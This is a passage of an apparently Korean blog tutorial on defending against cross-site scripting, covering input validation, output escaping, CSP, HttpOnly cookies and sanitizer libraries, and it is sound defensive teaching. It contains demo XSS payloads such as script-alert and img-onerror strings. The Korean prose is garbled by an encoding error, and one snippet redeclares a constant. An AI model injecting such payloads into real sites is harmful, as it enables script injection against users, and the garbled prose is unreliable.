class="property">textContent</span> = userInput;  <span class="comment">// HTML íŒŒì‹± ì•ˆ í•¨</span></span><br><span class="line">element.<span class="property">innerText</span> = userInput;    <span class="comment">// HTML íŒŒì‹± ì•ˆ í•¨</span></span><br></pre></td></tr></table></figure><h2 id="ğŸ›¡ï¸-XSS-ë°©ì–´-ê¸°ë²•"><a href="#ğŸ›¡ï¸-XSS-ë°©ì–´-ê¸°ë²•" class="headerlink" title="ğŸ›¡ï¸ XSS ë°©ì–´ ê¸°ë²•"></a>ğŸ›¡ï¸ XSS ë°©ì–´ ê¸°ë²•</h2><h3 id="1-ì…ë ¥-ê²€ì¦-ë°-ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜-Input-Validation-Sanitization"><a href="#1-ì…ë ¥-ê²€ì¦-ë°-ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜-Input-Validation-Sanitization" class="headerlink" title="1. ì…ë ¥ ê²€ì¦ ë° ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜ (Input Validation &amp; Sanitization)"></a>1. ì…ë ¥ ê²€ì¦ ë° ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜ (Input Validation &amp; Sanitization)</h3><h4 id="ë°±ì—”ë“œ-ê²€ì¦-í•„ìˆ˜"><a href="#ë°±ì—”ë“œ-ê²€ì¦-í•„ìˆ˜" class="headerlink" title="ë°±ì—”ë“œ ê²€ì¦ (í•„ìˆ˜)"></a>ë°±ì—”ë“œ ê²€ì¦ (í•„ìˆ˜)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Spring Boot + JSR-303 Validation</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;?&gt; createComment(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> CommentDto dto) &#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(commentService.save(dto));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommentDto</span> &#123;</span><br><span class="line">    <span class="meta">@NotBlank</span></span><br><span class="line">    <span class="meta">@Size(min = 1, max = 500)</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;^[^&lt;&gt;]*$&quot;, message = &quot;HTML íƒœê·¸ëŠ” í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Node.js + express-validator</span></span><br><span class="line"><span class="keyword">const</span> &#123; body, validationResult &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-validator&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/comment&#x27;</span>,</span><br><span class="line">  <span class="title function_">body</span>(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    .<span class="title function_">trim</span>()</span><br><span class="line">    .<span class="title function_">isLength</span>(&#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">500</span> &#125;)</span><br><span class="line">    .<span class="built_in">escape</span>(),  <span class="comment">// HTML ì—”í‹°í‹° ë³€í™˜</span></span><br><span class="line">  <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> errors = <span class="title function_">validationResult</span>(req);</span><br><span class="line">    <span class="keyword">if</span> (!errors.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">errors</span>: errors.<span class="title function_">array</span>() &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ì €ì¥ ë¡œì§</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="HTML-ì—”í‹°í‹°-ì¸ì½”ë”©"><a href="#HTML-ì—”í‹°í‹°-ì¸ì½”ë”©" class="headerlink" title="HTML ì—”í‹°í‹° ì¸ì½”ë”©"></a>HTML ì—”í‹°í‹° ì¸ì½”ë”©</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ìœ„í—˜í•œ ë¬¸ìë¥¼ HTML ì—”í‹°í‹°ë¡œ ë³€í™˜</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;</span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#039;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;&amp;#x2F;&#x27;</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;/]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> map[char]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš© ì˜ˆì‹œ</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> safe = escapeHtml(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(safe);</span><br><span class="line"><span class="comment">// &amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;&amp;#x2F;script&amp;gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-ì¶œë ¥-ì¸ì½”ë”©-Output-Encoding"><a href="#2-ì¶œë ¥-ì¸ì½”ë”©-Output-Encoding" class="headerlink" title="2. ì¶œë ¥ ì¸ì½”ë”© (Output Encoding)"></a>2. ì¶œë ¥ ì¸ì½”ë”© (Output Encoding)</h3><h4 id="í…œí”Œë¦¿-ì—”ì§„-ìë™-ì´ìŠ¤ì¼€ì´í”„"><a href="#í…œí”Œë¦¿-ì—”ì§„-ìë™-ì´ìŠ¤ì¼€ì´í”„" class="headerlink" title="í…œí”Œë¦¿ ì—”ì§„ ìë™ ì´ìŠ¤ì¼€ì´í”„"></a>í…œí”Œë¦¿ ì—”ì§„ ìë™ ì´ìŠ¤ì¼€ì´í”„</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymeleaf (Spring) - ê¸°ë³¸ì ìœ¼ë¡œ ì´ìŠ¤ì¼€ì´í”„ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;userInput&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ê²°ê³¼: &amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML ê·¸ëŒ€ë¡œ ì¶œë ¥ (ìœ„í—˜!) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;userInput&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ê²°ê³¼: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; âš ï¸ ì‹¤í–‰ë¨! --&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// React - ê¸°ë³¸ì ìœ¼ë¡œ ì´ìŠ¤ì¼€ì´í”„</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Comment</span>(<span class="params">&#123; text &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;text&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="comment">// ìë™ìœ¼ë¡œ HTML ì—”í‹°í‹°ë¡œ ë³€í™˜</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìœ„í—˜í•œ ë°©ë²• (ì‚¬ìš© ê¸ˆì§€)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">DangerousComment</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">html</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">  <span class="comment">// âš ï¸ XSS ì·¨ì•½ì  ë°œìƒ!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Vue.js - ê¸°ë³¸ì ìœ¼ë¡œ ì´ìŠ¤ì¼€ì´í”„ --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;!-- ì•ˆì „: HTML ì—”í‹°í‹°ë¡œ ë³€í™˜ --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div v-html=&quot;userInput&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;!-- âš ï¸ ìœ„í—˜: HTML ê·¸ëŒ€ë¡œ ë Œë”ë§ --&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="3-Content-Security-Policy-CSP"><a href="#3-Content-Security-Policy-CSP" class="headerlink" title="3. Content Security Policy (CSP)"></a>3. Content Security Policy (CSP)</h3><p>ë¸Œë¼ìš°ì €ì—ê²Œ â€œì–´ë–¤ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í• ì§€â€ ì•Œë ¤ì£¼ëŠ” ë³´ì•ˆ ì •ì±…ì…ë‹ˆë‹¤.</p><h4 id="CSP-í—¤ë”-ì„¤ì •"><a href="#CSP-í—¤ë”-ì„¤ì •" class="headerlink" title="CSP í—¤ë” ì„¤ì •"></a>CSP í—¤ë” ì„¤ì •</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;;</span><br><span class="line">                         script-src &#x27;self&#x27; https://trusted-cdn.com;</span><br><span class="line">                         style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line">                         img-src &#x27;self&#x27; data: https:;</span><br><span class="line">                         connect-src &#x27;self&#x27; https://api.example.com;</span><br><span class="line">                         font-src &#x27;self&#x27; https://fonts.googleapis.com;</span><br><span class="line">                         object-src &#x27;none&#x27;;</span><br><span class="line">                         base-uri &#x27;self&#x27;;</span><br><span class="line">                         form-action &#x27;self&#x27;;</span><br></pre></td></tr></table></figure><h4 id="CSP-ë””ë ‰í‹°ë¸Œ-ì„¤ëª…"><a href="#CSP-ë””ë ‰í‹°ë¸Œ-ì„¤ëª…" class="headerlink" title="CSP ë””ë ‰í‹°ë¸Œ ì„¤ëª…"></a>CSP ë””ë ‰í‹°ë¸Œ ì„¤ëª…</h4><table><thead><tr><th>ë””ë ‰í‹°ë¸Œ</th><th>ì„¤ëª…</th></tr></thead><tbody><tr><td><code>default-src</code></td><td>ëª¨ë“  ë¦¬ì†ŒìŠ¤ì˜ ê¸°ë³¸ ì •ì±…</td></tr><tr><td><code>script-src</code></td><td>JavaScript ì‹¤í–‰ ê°€ëŠ¥í•œ ì¶œì²˜</td></tr><tr><td><code>style-src</code></td><td>CSS ì¶œì²˜</td></tr><tr><td><code>img-src</code></td><td>ì´ë¯¸ì§€ ì¶œì²˜</td></tr><tr><td><code>connect-src</code></td><td>AJAX, WebSocket ì—°ê²° í—ˆìš© ì¶œì²˜</td></tr><tr><td><code>font-src</code></td><td>í°íŠ¸ ì¶œì²˜</td></tr><tr><td><code>object-src</code></td><td><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code> íƒœê·¸ ì¶œì²˜</td></tr><tr><td><code>base-uri</code></td><td><code>&lt;base&gt;</code> íƒœê·¸ ì œí•œ</td></tr><tr><td><code>form-action</code></td><td>í¼ ì œì¶œ ê°€ëŠ¥í•œ URL</td></tr></tbody></table><h4 id="CSP-íŠ¹ìˆ˜-ê°’"><a href="#CSP-íŠ¹ìˆ˜-ê°’" class="headerlink" title="CSP íŠ¹ìˆ˜ ê°’"></a>CSP íŠ¹ìˆ˜ ê°’</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27;none&#x27;              - ëª¨ë“  ì¶œì²˜ ì°¨ë‹¨</span><br><span class="line">&#x27;self&#x27;              - ê°™ì€ ë„ë©”ì¸ë§Œ í—ˆìš©</span><br><span class="line">&#x27;unsafe-inline&#x27;     - ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸/ìŠ¤íƒ€ì¼ í—ˆìš© (âš ï¸ ìœ„í—˜)</span><br><span class="line">&#x27;unsafe-eval&#x27;       - eval() ì‚¬ìš© í—ˆìš© (âš ï¸ ìœ„í—˜)</span><br><span class="line">&#x27;strict-dynamic&#x27;    - Nonce/Hashë¡œ ë¡œë“œëœ ìŠ¤í¬ë¦½íŠ¸ê°€ ìƒì„±í•œ ìŠ¤í¬ë¦½íŠ¸ í—ˆìš©</span><br><span class="line">&#x27;nonce-&lt;random&gt;&#x27;    - íŠ¹ì • ë‚œìˆ˜ë¥¼ ê°€ì§„ ìŠ¤í¬ë¦½íŠ¸ë§Œ í—ˆìš©</span><br><span class="line">&#x27;sha256-&lt;hash&gt;&#x27;     - íŠ¹ì • í•´ì‹œë¥¼ ê°€ì§„ ìŠ¤í¬ë¦½íŠ¸ë§Œ í—ˆìš©</span><br></pre></td></tr></table></figure><h4 id="Spring-Boot-CSP-ì„¤ì •"><a href="#Spring-Boot-CSP-ì„¤ì •" class="headerlink" title="Spring Boot CSP ì„¤ì •"></a>Spring Boot CSP ì„¤ì •</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .headers(headers -&gt; headers</span><br><span class="line">                .contentSecurityPolicy(csp -&gt; csp</span><br><span class="line">                    .policyDirectives(</span><br><span class="line">                        <span class="string">&quot;default-src &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27; https://cdn.jsdelivr.net; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;img-src &#x27;self&#x27; data: https:; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;font-src &#x27;self&#x27; https://fonts.googleapis.com; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;connect-src &#x27;self&#x27; https://api.example.com; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;frame-ancestors &#x27;none&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;base-uri &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;form-action &#x27;self&#x27;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Nonce-ê¸°ë°˜-CSP-ê¶Œì¥"><a href="#Nonce-ê¸°ë°˜-CSP-ê¶Œì¥" class="headerlink" title="Nonce ê¸°ë°˜ CSP (ê¶Œì¥)"></a>Nonce ê¸°ë°˜ CSP (ê¶Œì¥)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Controller</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">page</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">nonce</span> <span class="operator">=</span> generateRandomNonce();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cspNonce&quot;</span>, nonce);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;page&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Nonce ìƒì„±</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">generateRandomNonce</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] nonceBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextBytes(nonceBytes);</span><br><span class="line">    <span class="keyword">return</span> Base64.getEncoder().encodeToString(nonceBytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymeleaf í…œí”Œë¦¿ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">th:content</span>=<span class="string">&quot;&#x27;script-src &#x27;&#x27;nonce-&#x27; + $&#123;cspNonce&#125; + &#x27;&#x27;&#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Nonce ì†ì„±ì´ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰ë¨ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">th:nonce</span>=<span class="string">&quot;$&#123;cspNonce&#125;&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This script will execute&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Nonceê°€ ì—†ìœ¼ë©´ ì°¨ë‹¨ë¨ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This will be blocked&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-HTTPOnly-Secure-ì¿ í‚¤"><a href="#4-HTTPOnly-Secure-ì¿ í‚¤" class="headerlink" title="4. HTTPOnly &amp; Secure ì¿ í‚¤"></a>4. HTTPOnly &amp; Secure ì¿ í‚¤</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123;</span><br><span class="line">            HttpOnly;        # JavaScriptë¡œ ì ‘ê·¼ ë¶ˆê°€</span><br><span class="line">            Secure;          # HTTPSì—ì„œë§Œ ì „ì†¡</span><br><span class="line">            SameSite=Strict  # CSRF ë°©ì–´</span><br></pre></td></tr></table></figure><h4 id="Spring-Boot-ì„¤ì •"><a href="#Spring-Boot-ì„¤ì •" class="headerlink" title="Spring Boot ì„¤ì •"></a>Spring Boot ì„¤ì •</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">session:</span></span><br><span class="line">      <span class="attr">cookie:</span></span><br><span class="line">        <span class="attr">http-only:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">secure:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">same-site:</span> <span class="string">strict</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java ì½”ë“œë¡œ ì¿ í‚¤ ì„¤ì •</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;?&gt; login(<span class="meta">@RequestBody</span> LoginDto dto, HttpServletResponse response) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> authService.login(dto);</span><br><span class="line"></span><br><span class="line">    <span class="type">ResponseCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> ResponseCookie.from(<span class="string">&quot;session_id&quot;</span>, sessionId)</span><br><span class="line">            .httpOnly(<span class="literal">true</span>)</span><br><span class="line">            .secure(<span class="literal">true</span>)</span><br><span class="line">            .sameSite(<span class="string">&quot;Strict&quot;</span>)</span><br><span class="line">            .path(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">            .maxAge(Duration.ofHours(<span class="number">1</span>))</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼-ì´ìš©í•œ-ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜"><a href="#5-ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼-ì´ìš©í•œ-ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜" class="headerlink" title="5. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì´ìš©í•œ ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜"></a>5. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì´ìš©í•œ ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜</h3><h4 id="DOMPurify-JavaScript"><a href="#DOMPurify-JavaScript" class="headerlink" title="DOMPurify (JavaScript)"></a>DOMPurify (JavaScript)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš©ì ì…ë ¥ì„ ì•ˆì „í•˜ê²Œ ì •ì œ</span></span><br><span class="line"><span class="keyword">const</span> dirty = <span class="string">&#x27;&lt;img src=x onerror=&quot;alert(\&#x27;XSS\&#x27;)&quot;&gt; &lt;b&gt;Hello&lt;/b&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clean);</span><br><span class="line"><span class="comment">// ê²°ê³¼: &lt;img src=&quot;x&quot;&gt; &lt;b&gt;Hello&lt;/b&gt;</span></span><br><span class="line"><span class="comment">// onerrorëŠ” ì œê±°ë¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ì„¤ì • ì˜µì…˜</span></span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty, &#123;</span><br><span class="line">  <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;em&#x27;</span>],</span><br><span class="line">  <span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="OWASP-Java-HTML-Sanitizer"><a href="#OWASP-Java-HTML-Sanitizer" class="headerlink" title="OWASP Java HTML Sanitizer"></a>OWASP Java HTML Sanitizer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.owasp.html.PolicyFactory;</span><br><span class="line"><span class="keyword">import</span> org.owasp.html.Sanitizers;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ê¸°ë³¸ ì •ì±… ì‚¬ìš©</span></span><br><span class="line"><span class="type">PolicyFactory</span> <span class="variable">policy</span> <span class="operator">=</span> Sanitizers.FORMATTING</span><br><span class="line">        .and(Sanitizers.LINKS);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">unsafe</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;b&gt;Hello&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">safe</span> <span class="operator">=</span> policy.sanitize(unsafe);</span><br><span class="line">System.out.println(safe);</span><br><span class="line"><span class="comment">// ê²°ê³¼: &lt;b&gt;Hello&lt;/b&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ì»¤ìŠ¤í…€ ì •ì±…</span></span><br><span class="line"><span class="type">PolicyFactory</span> <span class="variable">customPolicy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlPolicyBuilder</span>()</span><br><span class="line">        .allowElements(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;div&quot;</span>, <span class="string">&quot;span&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;strong&quot;</span>, <span class="string">&quot;em&quot;</span>)</span><br><span class="line">        .allowAttributes(<span class="string">&quot;href&quot;</span>).onElements(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        .allowAttributes(<span class="string">&quot;class&quot;</span>).matching(Pattern.compile(<span class="string">&quot;[a-zA-Z0-9-_]+&quot;</span>))</span><br><span class="line">        .toFactory();</span><br></pre></td></tr></table></figure><h3 id="6-í”„ë ˆì„ì›Œí¬-ê¸°ë³¸-ë³´í˜¸-ê¸°ëŠ¥-í™œìš©"><a href="#6-í”„ë ˆì„ì›Œí¬-ê¸°ë³¸-ë³´í˜¸-ê¸°ëŠ¥-í™œìš©" class="headerlink" title="6. í”„ë ˆì„ì›Œí¬ ê¸°ë³¸ ë³´í˜¸ ê¸°ëŠ¥ í™œìš©"></a>6. í”„ë ˆì„ì›Œí¬ ê¸°ë³¸ ë³´í˜¸ ê¸°ëŠ¥ í™œìš©</h3><h4 id="React"><a href="#React" class="headerlink" title="React"></a>React</h4><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âœ… ì•ˆì „ - ìë™ ì´ìŠ¤ì¼€ì´í”„</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SafeComponent</span>(<span class="params">&#123; userInput &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;userInput&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âŒ ìœ„í—˜ - ì§ì ‘ HTML ì‚½ì…</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">DangerousComponent</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">html</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ì•ˆì „ - DOMPurifyë¡œ ì •ì œ í›„ ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SafeHtmlComponent</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span 